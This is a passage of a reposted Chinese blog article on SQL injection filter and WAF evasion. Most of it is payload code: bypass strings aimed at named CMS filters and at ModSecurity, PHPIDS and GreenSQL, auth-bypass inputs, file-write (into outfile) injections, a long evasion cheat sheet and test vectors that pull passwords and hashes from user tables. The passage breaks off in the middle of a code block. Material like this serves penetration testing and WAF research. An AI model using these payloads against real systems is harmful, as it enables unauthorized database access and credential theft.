+<p>看罢上面两个示例，发现和HPP最后一个示例很像，不同之处在于参数不一样，这里是在不同的参数之间进行分割，到了数据库执行查询时再合并语句。</p>
+<ol start="3">
+<li>HPC(HTTP Parameter Contamination)</li>
+</ol>
+<p>这一概念见于exploit-db上的paper：Beyond SQLi: Obfuscate and Bypass，Contamination同样意为污染</p>
+<p>RFC2396定义了如下一些字符：</p>
+<p>Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * ‘ ()<br>Reserved : ; / ? : @ &amp; = + $ ,<br>Unwise : { } | \ ^ [ ] `</p>
+<p>不同的Web服务器处理处理构造得特殊请求时有不同的逻辑：</p>
+<p><img src="/2020/08/11/%E8%BD%AC%E8%BD%BD-sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A4%A7%E9%9B%86%E5%90%88/3.jpg"></p>
+<p>以魔术字符%为例，Asp/Asp.net会受到影响</p>
+<p><img src="/2020/08/11/%E8%BD%AC%E8%BD%BD-sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A4%A7%E9%9B%86%E5%90%88/4.jpg"></p>
+<h2 id="i-缓冲区溢出-Advanced"><a href="#i-缓冲区溢出-Advanced" class="headerlink" title="i) 缓冲区溢出(Advanced)"></a>i) 缓冲区溢出(Advanced)</h2><p>缓冲区溢出用于对付WAF，有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过</p>
+<p>举例：</p>
+<p><strong>?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</strong></p>
+<p>示例0xA*1000指0xA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出</p>
+<h2 id="j-整合绕过"><a href="#j-整合绕过" class="headerlink" title="j) 整合绕过"></a>j) 整合绕过</h2><p>整合的意思是结合使用前面谈到的各种绕过技术，单一的技术可能无法绕过过滤机制，但是多种技术的配合使用成功的可能性就会增加不少了。这一方面来说是总体与局部和的关系，另一方面则是多种技术的使用创造了更多的可能性，除非每一种技术单独都无法使用，否则它们能产生比自身大得多的能量。</p>
+<p>举例：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">z.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 <span class="string">&quot;A&quot;</span>)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4…</span><br><span class="line"></span><br><span class="line">id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()– -</span><br><span class="line"></span><br><span class="line">?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e--  </span><br></pre></td></tr></table></figure>
+
+<h1 id="0x3-SQLi-Filter的实现及Evasion"><a href="#0x3-SQLi-Filter的实现及Evasion" class="headerlink" title="0x3 SQLi Filter的实现及Evasion"></a>0x3 SQLi Filter的实现及Evasion</h1><p>SQL Injection时用得最多的一些关键字如下：and, or, union, where, limit, group by, select, ‘, hex, substr, white space</p>
+<p>对它们的检测，完整正则表达式为：preg_match(‘/(and|or|union|where|limit|group by|select|&#39;|hex|substr|\s)/i’, $id)</p>
+<p>其应对方式依次为：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">***note***:<span class="string">&quot;=&gt;&quot;</span>左边表示会被Filtered的语句，<span class="string">&quot;=&gt;&quot;</span>右边表示成功Bypass的语句，左边标红的为被Filtered的关键字，右边标蓝的为替代其功能的函数或关键字and =&gt; &amp;&amp; 　　or =&gt; ||union select user, password from users　　 =&gt;　　1 || (select user from users <span class="built_in">where</span> user_id = 1) = <span class="string">&#x27;admin1 || (select user from users where user_id = 1) = &#x27;</span>admin<span class="string">&#x27;　　=&gt;　　1 || (select user from users limit 1) = &#x27;</span>admin1 || (select user from users <span class="built_in">limit</span> 1) = <span class="string">&#x27;admin&#x27;</span> =&gt;　　1 || (select user from users group by user_id having user_id = 1) = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">1 || (select user from users group by user_id having user_id = 1) = <span class="string">&#x27;admin&#x27;</span> =&gt;　1 || (select substr(group_concat(user_id),1,1) user from users )=1</span><br><span class="line">1 || (select substr(group_concat(user_id),1,1) user from users) = 1 =&gt;	1 || 1 = 1 into outfile <span class="string">&#x27;result.txt&#x27;</span>　或者  1 || substr(user,1,1) = <span class="string">&#x27;a&#x27;</span>　</span><br><span class="line">1 || (select substr(group_concat(user_id),1,1) user from users) = 1 　=&gt;　　1 || user_id is not null 或者 1 || substr(user,1,1) = 0x61</span><br><span class="line">　　　或者 1 || substr(user,1,1) = unhex(61)　　//　<span class="string">&#x27; Filtered</span></span><br><span class="line"><span class="string">1 || substr(user,1,1) = unhex(61)　　=&gt;	1 || substr(user,1,1) = lower(conv(11,10,36))</span></span><br><span class="line"><span class="string">1 || substr(user,1,1) = lower(conv(11,10,36)) =&gt;　　1 || lpad(user,7,1)</span></span><br><span class="line"><span class="string">1 || lpad(user,7,1)　　=&gt;　　1%0b||%0blpad(user,7,1)　　// &#x27;</span> <span class="string">&#x27; Filtered</span></span><br></pre></td></tr></table></figure>
+
+<p> 从上面给出的示例来看，没有绝对的过滤，即便平时构建一个正常SQL语句的全部关键字都被过滤了，我们也还是能找到Bypass的方法。普世的阳光和真理尚且照不到每一个角落，人为构建出来的一个工具WAF就更加不可能尽善尽美了。我们可以相信WAF能为我们抵挡很多攻击，但是绝不能百分之一百的依赖它，就算它有着世上最为健全的规则，它本身也是会存在缺陷的。</p>
+<p>从前面到现在，基本上每条注入语句中都有数字，如果某查询的数据类型为字符串、或者做了严格限制数字要被和谐掉，这就有点棘手了，不过办法总是有的：</p>
+<p><img src="/2020/08/11/%E8%BD%AC%E8%BD%BD-sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A4%A7%E9%9B%86%E5%90%88/5.png"></p>
+<p><img src="/2020/08/11/%E8%BD%AC%E8%BD%BD-sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A4%A7%E9%9B%86%E5%90%88/6.png"></p>
+<p>上面两张图，第一张是不能使用数字时通过使用数学函数得到某个数字的值，第二章则是这些数字对应的36进制的值，因此有时候一个很简单的表达式可能会很复杂或者非常长，其实际就是计算mod(a,b)：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(mod(length(trim(leading(concat(lower(conv(version()*(<span class="literal">true</span>+pi()),pi()*pi(),pow(pi(),pi()))),lower(conv(pi()*pi()*pi()-pi()-pi(),pi()*pi(), </span><br><span class="line">pow(pi(),pi()))),lower(conv(pi()*version(),pi()*pi(),pow(pi(),pi()))),conv(version()*(<span class="literal">true</span>+pi()),pi()*pi(),pow(pi(),pi())),lower(conv(pi()*pi()*pi()-pi()-pi(),pi()*pi(),pow(pi(),pi()))),lower(conv(pi()*version(),pi()*pi(),pow(pi(),pi()))),lower(conv(ceil(pi()*version())+<span class="literal">true</span>,pi()*pi(),pow(pi(), pi()))),lower(conv(ceil((pi()+ceil(pi()))*pi()),pi()*pi(),pow(pi(),pi()))),lower(conv(ceil(pi())*ceil(pi()+pi()),pi()*pi(),pow(pi(),pi()))),conv(ceil(pi()*version()),pi()*pi(),pow(pi(),pi())),lower(conv(ceil(pi()*pi()+pi()),pi()*pi(),pow(pi(),pi()))),lower(conv(ceil(version()*version()),pi()*pi(),pow(pi(),pi()))),lower(conv(ceil(pi()*pi()+pi()),pi()*pi(),pow(pi(),pi())))))from(pass))),length(pass))</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x4-延伸及测试向量示例"><a href="#0x4-延伸及测试向量示例" class="headerlink" title="0x4 延伸及测试向量示例"></a>0x4 延伸及测试向量示例</h1><p>a) CMS绕过实例</p>
+<p>b) WAF绕过示例</p>
+<p>c) SQLi Filter Evasion Cheat sheet</p>
+<p>d) 测试向量</p>
+<h2 id="a-Web应用绕过示例"><a href="#a-Web应用绕过示例" class="headerlink" title="a) Web应用绕过示例"></a>a) Web应用绕过示例</h2><ol>
+<li><p>e107 CMS</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$inArray</span> = array(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;/**/&quot;</span>, <span class="string">&quot;/UNION/&quot;</span>, <span class="string">&quot;/SELECT/&quot;</span>, <span class="string">&quot;AS &quot;</span>); </span><br><span class="line"><span class="keyword">if</span> (strpos(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>], <span class="string">&quot;trackback&quot;</span>) === <span class="literal">false</span>) &#123; </span><br><span class="line">foreach(<span class="variable">$inArray</span> as <span class="variable">$res</span>) &#123; </span><br><span class="line"><span class="keyword">if</span>(stristr(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="variable">$res</span>)) &#123; </span><br><span class="line">die(<span class="string">&quot;Access denied.&quot;</span>); </span><br><span class="line">&#125;&#125;&#125;Bypass: vuln.php/trackback?inject=UNI%6fN SELECT</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>PHP-Nuke CMS</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]) </span><br><span class="line">&amp;&amp; (!stripos(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&quot;ad_click&quot;</span>))) &#123; </span><br><span class="line"><span class="variable">$queryString</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span> ( stripos(<span class="variable">$queryString</span>, <span class="string">&#x27;%20union%20&#x27;</span>) </span><br><span class="line">OR stripos(<span class="variable">$queryString</span>, <span class="string">&#x27;/*&#x27;</span>) </span><br><span class="line">OR stripos(<span class="variable">$queryString</span>, <span class="string">&#x27;*/union/*&#x27;</span>) </span><br><span class="line">OR stripos(<span class="variable">$queryString</span>, <span class="string">&#x27;+union+&#x27;</span>) </span><br><span class="line">OR stripos(<span class="variable">$queryString</span>, <span class="string">&#x27;concat&#x27;</span>)) &#123; die(<span class="string">&#x27;Illegal Operation&#x27;</span>); &#125;Bypass: vuln.php?inject=%a0UNI%6fN(SELECT<span class="string">&#x27;ad_click&#x27;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>TYPO3 CMS</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$val</span> = str_replace(array(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot; &quot;</span>,<span class="string">&quot;(&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$arrFields</span>[<span class="variable">$fname</span>]); // basic defence</span><br><span class="line">Bypass: vuln.php?id=1/**/union%a0select/**/1,pass,3`a`from`users`</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h2 id="b-WAF绕过示例"><a href="#b-WAF绕过示例" class="headerlink" title="b) WAF绕过示例"></a>b) WAF绕过示例</h2><ol>
+<li><p>ModSecurity CRS 2.0.9 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;and 0x61=(/*foo*/SELECT mid(pass,1,1) from users limit 1,1)and&#x27;</span>1</span><br><span class="line">1<span class="string">&#x27;union/*!select*/pass,load_file(0x123456789)from users-- -</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>PHPIDS 0.6.4 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">foo<span class="string">&#x27;!=@a:=0x1 div&#x27;</span>1a <span class="literal">false</span> != <span class="literal">true</span> 　　//auth bypass</span><br><span class="line">　foo<span class="string">&#x27;div count(select`pass`from(users)where mid(pass,1,1)rlike lower(conv(10,pi()*pi(),pi()*pi())) )-&#x27;</span>0</span><br><span class="line"></span><br><span class="line">　a<span class="string">&#x27;in(true) and false */*!(true)union#newline select pass`alias`from users where true*/* n&#x27;</span>1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>GreenSQL 1.3.0 </p>
+</li>
+</ol>
+<p>检测关键字：union, information_schema, into outfile, current_user, current_date, version</p>
+<p>检测函数：mid(), substring(), substr(), load_file(), benchmark(), user(), database(), version()</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">adm<span class="string">&#x27; &#x27;</span><span class="keyword">in</span><span class="string">&#x27; or 1=&#x27;</span>1        // auth bypass</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;-(1)union(select table_name,load_file(&#x27;</span>/tmp/<span class="built_in">test</span><span class="string">&#x27;),@@version</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">from /*! information_schema.tables */);%00    //select union</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span>-<span class="string">&#x27;&#x27;</span> into%a0outfile <span class="string">&#x27;/tmp/test   //write to file</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="c-SQLi-Filter-Evasion-Cheat-sheet"><a href="#c-SQLi-Filter-Evasion-Cheat-sheet" class="headerlink" title="c) SQLi Filter Evasion Cheat sheet"></a>c) SQLi Filter Evasion Cheat sheet</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释</span></span><br><span class="line">‘ or 1=1<span class="comment">#</span></span><br><span class="line">‘ or 1=1/* (MySQL &lt; 5.1)</span><br><span class="line"><span class="string">&#x27; or 1=1;%00</span></span><br><span class="line"><span class="string">&#x27;</span> or 1=1 union select 1,2 as `</span><br><span class="line"><span class="string">&#x27; or#newline</span></span><br><span class="line"><span class="string">&#x27;</span> /*!50000or*/1=<span class="string">&#x27;1</span></span><br><span class="line"><span class="string">&#x27;</span> /*!or*/1=<span class="string">&#x27;1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#前缀</span></span><br><span class="line"><span class="string">+ – ~ !</span></span><br><span class="line"><span class="string">‘ or –+2=- -!!!’2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#操作符：</span></span><br><span class="line"><span class="string">^, =, !=, %, /, *, &amp;, &amp;&amp;, |, ||, , &gt;&gt;, &lt;=, &lt;=, ,, XOR, DIV, LIKE, SOUNDS LIKE, RLIKE, REGEXP, LEAST, GREATEST, CAST, CONVERT, IS, IN, NOT, MATCH, AND, OR, BINARY, BETWEEN, ISNULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#空格</span></span><br><span class="line"><span class="string">%20 %09 %0a %0b %0c %0d %a0 /**/</span></span><br><span class="line"><span class="string">‘or+(1)sounds/**/like“1“–%a0-</span></span><br><span class="line"><span class="string">‘union(select(1),tabe_name,(3)from`information_schema`.`tables`)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#有引号的字符串</span></span><br><span class="line"><span class="string">SELECT ‘a’</span></span><br><span class="line"><span class="string">SELECT “a”</span></span><br><span class="line"><span class="string">SELECT n’a’</span></span><br><span class="line"><span class="string">SELECT b’1100001′</span></span><br><span class="line"><span class="string">SELECT _binary’1100001′</span></span><br><span class="line"><span class="string">SELECT x’61′</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#没有引号的字符串</span></span><br><span class="line"><span class="string">　‘abc’ = 0×616263</span></span><br><span class="line"><span class="string">　　&#x27;</span> and substr(data,1,1) = <span class="string">&#x27;a&#x27;</span><span class="comment">#　　&#x27; and substr(data,1,1) = 0x61	# 0x6162　　&#x27; and substr(data,1,1) = unhex(61)	# unhex(6162)　　&#x27; and substr(data,1,1) = char(97	)# char(97,98)　　&#x27; and substr(data,1,1) = &#x27;a&#x27;#　　&#x27; and hex(substr(data,1,1)) = 61#　　&#x27; and ascii(substr(data,1,1)) = 97#　　&#x27; and ord(substr(data,1,1)) = 97# 　　&#x27; and substr(data,1,1) = lower(conv(10,10,36))# &#x27;a&#x27;</span></span><br><span class="line"><span class="comment">#别名</span></span><br><span class="line">select pass as <span class="built_in">alias</span> from users</span><br><span class="line">select pass`<span class="built_in">alias</span> <span class="built_in">alias</span>`from users</span><br><span class="line"></span><br><span class="line"><span class="comment">#字型</span></span><br><span class="line">‘ or <span class="literal">true</span> = ’1 <span class="comment"># or 1=1</span></span><br><span class="line">‘ or round(pi(),1)+<span class="literal">true</span>+<span class="literal">true</span> = version() <span class="comment"># or 3.1+1+1 = 5.1</span></span><br><span class="line">‘ or ’1 <span class="comment"># or true</span></span><br><span class="line"><span class="comment">#操作符字型</span></span><br><span class="line">select * from users <span class="built_in">where</span> ‘a’=<span class="string">&#x27;b’=&#x27;</span>c’</span><br><span class="line">select * from users <span class="built_in">where</span> (‘a’=<span class="string">&#x27;b’)=’c’</span></span><br><span class="line"><span class="string">select * from users where (false)=’c’</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#认真绕过‘=’</span></span><br><span class="line"><span class="string">select * from users where name = ”=”</span></span><br><span class="line"><span class="string">select * from users where false = ”</span></span><br><span class="line"><span class="string">select * from users where 0 = 0</span></span><br><span class="line"><span class="string">select * from users where true#函数过滤器ascii (97)</span></span><br><span class="line"><span class="string">load_file/*foo*/(0×616263)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#用函数构建字符串</span></span><br><span class="line"><span class="string">‘abc’ = unhex(616263)</span></span><br><span class="line"><span class="string">‘abc’ = char(97,98,99)</span></span><br><span class="line"><span class="string"> hex(‘a’) = 61</span></span><br><span class="line"><span class="string"> ascii(‘a’) = 97</span></span><br><span class="line"><span class="string"> ord(‘a’) = 97</span></span><br><span class="line"><span class="string">‘ABC’ = concat(conv(10,10,36),conv(11,10,36),conv(12,10,36))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#特殊字符</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">　　aes_encrypt(1,12) // 4鏷眥&quot;^z譎é蒃a　　des_encrypt(1,2) 						// 侴Ò/镏k　　@@ft_boolean_syntax 					// + -&gt;&lt;()~*:&quot;&quot;&amp;|　　@@date_format 						// %Y-%m-%d　　@@innodb_log_group_home_dir 		// .\</span></span><br><span class="line"><span class="string">@@new: 0</span></span><br><span class="line"><span class="string">@@log_bin: 1</span></span><br><span class="line"><span class="string">#提取子字符串substr(‘abc’,1,1) = ‘a’</span></span><br><span class="line"><span class="string">substr(‘abc’ from 1 for 1) = ‘a’</span></span><br><span class="line"><span class="string">substring(‘abc’,1,1) = ‘a’</span></span><br><span class="line"><span class="string">substring(‘abc’ from 1 for 1) = ‘a’</span></span><br><span class="line"><span class="string">mid(‘abc’,1,1) = ‘a’</span></span><br><span class="line"><span class="string">mid(‘abc’ from 1 for 1) = ‘a’</span></span><br><span class="line"><span class="string">lpad(‘abc’,1,space(1)) = ‘a’</span></span><br><span class="line"><span class="string">rpad(‘abc’,1,space(1)) = ‘a’</span></span><br><span class="line"><span class="string">left(‘abc’,1) = ‘a’</span></span><br><span class="line"><span class="string">reverse(right(reverse(‘abc’),1)) = ‘a’</span></span><br><span class="line"><span class="string">insert(insert(‘abc’,1,0,space(0)),2,222,space(0)) = ‘a’</span></span><br><span class="line"><span class="string">space(0) = trim(version()from(version()))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#搜索子字符串</span></span><br><span class="line"><span class="string">locate(‘a’,&#x27;</span>abc’)</span><br><span class="line">position(‘a’,<span class="string">&#x27;abc’)</span></span><br><span class="line"><span class="string">position(‘a’ IN ‘abc’)</span></span><br><span class="line"><span class="string">instr(‘abc’,&#x27;</span>a’)</span><br><span class="line">substring_index(‘ab’,<span class="string">&#x27;b’,1)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#分割字符串</span></span><br><span class="line"><span class="string">length(trim(leading ‘a’ FROM ‘abc’))</span></span><br><span class="line"><span class="string">length(replace(‘abc’, ‘a’, ”))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#比较字符串</span></span><br><span class="line"><span class="string">strcmp(‘a’,&#x27;</span>a’)</span><br><span class="line">mod(‘a’,<span class="string">&#x27;a’)</span></span><br><span class="line"><span class="string">find_in_set(‘a’,&#x27;</span>a’)</span><br><span class="line">field(‘a’,<span class="string">&#x27;a’)</span></span><br><span class="line"><span class="string">count(concat(‘a’,&#x27;</span>a’))</span><br><span class="line"></span><br><span class="line"><span class="comment">#字符串长度</span></span><br><span class="line">length()</span><br><span class="line">bit_length()</span><br><span class="line">char_length()</span><br><span class="line">octet_length()</span><br><span class="line">bit_count()</span><br><span class="line"></span><br><span class="line"><span class="comment">#关键字过滤</span></span><br><span class="line">Connected keyword filtering</span><br><span class="line">(0)union(select(table_name),column_name,…</span><br><span class="line">0/**/union/*!50000select*/table_name`foo`/**/…</span><br><span class="line">0%a0union%a0select%09group_concat(table_name)….</span><br><span class="line">0′union all select all`table_name`foo from`information_schema`. `tables`</span><br><span class="line"></span><br><span class="line"><span class="comment">#控制流</span></span><br><span class="line"><span class="keyword">case</span> ‘a’ when ‘a’ <span class="keyword">then</span> 1 [<span class="keyword">else</span> 0] end</span><br><span class="line"><span class="keyword">case</span> when ‘a’=<span class="string">&#x27;a’ then 1 [else 0] end</span></span><br><span class="line"><span class="string">if(‘a’=&#x27;</span>a’,1,0)</span><br><span class="line">ifnull(nullif(‘a’,<span class="string">&#x27;a’),1)</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="d-测试向量"><a href="#d-测试向量" class="headerlink" title="d)测试向量"></a>d)测试向量</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">%55nion(%53elect 1,2,3)-- -</span><br><span class="line">+union+distinctROW+select+/**//*!12345UNION SELECT*//**//**/UNION/**//*!50000SELECT*//**//*!50000UniON SeLeCt*/+<span class="comment">#uNiOn+#sEleCt+#1q%0AuNiOn all#qa%0A#%0AsEleCt/*!u%6eion*/ /*!se%6cect*/+un/**/ion+se/**/lectuni%0bon+se%0blect%2f**%2funion%2f**%2fselectunion%23foo*%2F*bar%0D%0Aselect%23foo%0D%0AREVERSE(noinu)+REVERSE(tceles)/*--*/union/*--*/select/*--*/union (/*!/**/ SeleCT */ 1,2,3)/*!union*/+/*!select*/union+/*!select*//**//*!union*//**//*!select*//**//*!uNIOn*/ /*!SelECt*/+union+distinctROW+select+-15+(uNioN)+(sElECt)-15+(UnI)(oN)+(SeL)(ecT)+</span></span><br><span class="line">id=1+UnIOn/**/SeLect 1,2,3—id=1+UNIunionON+SELselectECT 1,2,3—id=1+/*!UnIOn*/+/*!sElEcT*/ 1,2,3—id=1 and (select 1)=(Select 0xAA 1000 more A’s)+UnIoN+SeLeCT 1,2,3—id=1+un/**/ion+sel/**/ect+1,2,3--id=1+/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/1,2,3id=1+/**/union/*&amp;id=*/select/*&amp;id=*/column/*&amp;id=*/from/*&amp;id=*/table--id=1+/**/union/*&amp;id=*/select/*&amp;id=*/1,2,3--id=-1 and (select 1)=(Select 0xAA*1000) /*!UNION*/ /*!SELECT*//**/1,2,3,4,5,6—x</span><br><span class="line"></span><br><span class="line">/**/union/*&amp;id=*/select/*&amp;id=*/column/*&amp;id=*/from/*&amp;id=*/table--/*!union*/+/*!select*/+1,2,3—/*!UnIOn*//*!SeLect*/+1,2,3—un/**/ion+sel/**/ect+1,2,3—/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/1,2,3—ID=66+UnIoN+aLL+SeLeCt+1,2,3,4,5,6,7,(SELECT+concat(0x3a,id,0x3a,password,0x3a)+FROM+information_schema.columns+WHERE+table_schema=0x6334706F645F666573746976616C5F636D73+AND+table_name=0x7573657273),9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--</span><br><span class="line">?id=1+and+ascii(lower(mid((select+<span class="built_in">pwd</span>+from+users+<span class="built_in">limit</span>+1,1),1,1)))=74index.php?uid=strcmp(left((select+<span class="built_in">hash</span>+from+users+<span class="built_in">limit</span>+0,1),1),0x42)+123?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,?id=15+/*!UnIoN*/+/*!aLl*/+/*!SeLeCt*/+1,version(),3,4,5,6,7--id=1/*!<span class="built_in">limit</span>+0+union+select+concat_ws(0×3a,table_name,column_name)+from+information_schema.columns*/</span><br><span class="line">id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(TABLE_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.TABLES-- id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e-- </span><br><span class="line">SELECT*FROM(<span class="built_in">test</span>)WHERE(name)IN(_ucs2 0x01df010e004d00cf0148);SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)) 	<span class="keyword">in</span> xml way</span><br><span class="line">select user from mysql.user <span class="built_in">where</span> user = <span class="string">&#x27;user&#x27;</span> OR mid(password,1,1)=unhex(<span class="string">&#x27;2a&#x27;</span>)select user from mysql.user <span class="built_in">where</span> user = <span 